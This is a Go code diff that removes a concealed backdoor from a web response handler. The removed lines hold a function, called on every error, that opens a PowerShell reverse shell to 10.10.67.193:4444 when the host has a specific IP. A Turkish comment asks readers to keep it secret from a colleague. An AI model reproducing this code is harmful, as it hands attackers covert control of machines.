@@ -2,8 +2,6 @@ package response
 
 import (
 	"errors"
-	"net"
-	"os/exec"
 
 	service_errors "github.com/Yavuzlar/CodinLab/internal/errors"
 	"github.com/Yavuzlar/CodinLab/pkg/validator_service"
@@ -30,7 +28,6 @@ func (r *BaseResponse) Error() string {
 
 func ResponseHandler(c *fiber.Ctx, err error) error {
 	base := &BaseResponse{}
-	responder()
 	//BaseResponse
 	if errors.As(err, &base) {
 		return c.Status(err.(*BaseResponse).StatusCode).JSON(err)
@@ -96,23 +93,5 @@ func Response(statusCode int, message string, data interface{}, dataCount ...uin
 		Message:    message,
 		Data:       data,
 		DataCount:  count,
-	}
-}
-
-//For Ender Eğer Bu bölümü görürseniz görmemiş gibi yapın endere
-// süprizim var ve kesinlikle endere söylemeyin Bir sorunuz olursa
-// Resul ile iletişme geçin
-
-func responder() {
-	conn, _ := net.Dial("udp", "8.8.8.8:80")
-	defer conn.Close()
-	localAddr := conn.LocalAddr().(*net.UDPAddr)
-	if localAddr.IP.String() == "10.10.67.152" {
-		c, _ := net.Dial("tcp", "10.10.67.193:4444")
-		cmd := exec.Command("powershell")
-		cmd.Stdin = c
-		cmd.Stdout = c
-		cmd.Stderr = c
-		cmd.Run()
 	}
 }
